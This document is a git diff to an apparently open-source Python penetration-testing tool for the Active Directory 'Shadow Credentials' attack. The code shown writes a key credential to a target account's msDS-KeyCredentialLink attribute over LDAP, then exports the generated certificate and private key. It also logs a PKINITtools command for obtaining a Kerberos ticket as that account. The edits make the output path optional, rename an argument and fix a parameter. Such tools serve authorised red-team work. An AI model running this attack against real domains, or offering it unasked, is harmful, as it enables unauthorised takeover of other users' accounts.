@@ -323,7 +323,7 @@ class ShadowCredentials(object):
             logger.info('Attribute msDS-KeyCredentialLink does not exist')
         return
 
-    def add(self, password, path, export_type, domain, samname):
+    def add(self, password, path, export_type, domain):
         logger.info("Searching for the target account")
         result = self.get_dn_sid_from_samname(self.target_samname)
         if not result:
@@ -354,13 +354,16 @@ class ShadowCredentials(object):
             self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.ldap_session.result['result'] == 0:
                 logger.success("Updated the msDS-KeyCredentialLink attribute of the target object")
+                if path is None:
+                    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                    logger.verbose("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
                 if export_type == "PEM":
                     certificate.ExportPEM(path_to_files=path)
                     logger.success("Saved PEM certificate at path: %s" % path + "_cert.pem")
                     logger.success("Saved PEM private key at path: %s" % path + "_priv.pem")
                     logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     logger.verbose("Run the following command to obtain a TGT")
-                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, samname, path))
+                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.target_samname, path))
                 elif export_type == "PFX":
                     if password is None:
                         password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
@@ -370,7 +373,7 @@ class ShadowCredentials(object):
                     logger.info("Must be used with password: %s" % password)
                     logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     logger.verbose("Run the following command to obtain a TGT")
-                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, samname, path))
+                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, self.target_samname, path))
             else:
                 if self.ldap_session.result['result'] == 50:
                     logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
@@ -617,7 +620,7 @@ def parse_args():
 
     add = parser.add_argument_group('arguments when setting -action to add')
     add.add_argument("-P", "--pfx-password", action='store', help='password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)')
-    add.add_argument("-o", "--output-path", action='store', help='filename to store the generated self-signed PEM or PFX certificate and key')
+    add.add_argument("-o", "--outfile-path", action='store', help='filename to store the generated self-signed PEM or PFX certificate and key')
     add.add_argument("-e", "--export", action='store', choices=["PEM"," PFX"], type = lambda s : s.upper(), default="PFX", help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')
 
     remove = parser.add_argument_group('arguments when setting -action to remove')
@@ -631,9 +634,6 @@ def parse_args():
 
     if (args.action == "remove" or args.action == "info") and args.device_id is None:
         parser.error("the following arguments are required when setting -action == remove or info")
-
-    if args.action == "add" and args.output_path is None:
-        parser.error("argument -o/--output-path is needed when using -action add")
 
     return args
 
@@ -658,7 +658,7 @@ def main():
         if args.action == 'list':
             shadowcreds.list()
         elif args.action == 'add':
-            shadowcreds.add(password=args.pfx_password, path=args.output_path, export_type=args.export, domain=args.auth_domain, samname=args.target_samname)
+            shadowcreds.add(password=args.pfx_password, path=args.outfile_path, export_type=args.export, domain=args.auth_domain)
         elif args.action == 'remove':
             shadowcreds.remove(args.device_id)
         elif args.action == 'info':
